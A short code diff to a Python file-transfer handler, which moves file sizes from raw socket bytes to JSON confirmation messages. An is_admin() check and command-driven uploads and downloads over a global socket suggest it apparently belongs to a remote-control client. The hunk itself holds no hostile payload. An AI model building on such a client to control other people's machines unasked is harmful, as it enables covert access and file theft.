@@ -79,12 +79,13 @@ def is_admin():
 def handle_file_transfer(command_data):
     try:
         if command_data['command'] == 'upload':
-            # Receive file size
-            size_data = s.recv(8)
-            file_size = int.from_bytes(size_data, byteorder='big')
+            filename = command_data['filename']
+            file_size = command_data['size']
+            
+            # Send ready confirmation
+            reliable_send({'ready': True})
             
             # Receive and save file
-            filename = command_data['filename']
             received = 0
             with open(filename, 'wb') as f:
                 while received < file_size:
@@ -106,7 +107,10 @@ def handle_file_transfer(command_data):
                     file_data = f.read()
                     
                 # Send file size first
-                s.sendall(len(file_data).to_bytes(8, byteorder='big'))
+                reliable_send({
+                    'size': len(file_data)
+                })
+                
                 # Send file data
                 s.sendall(file_data)
                 
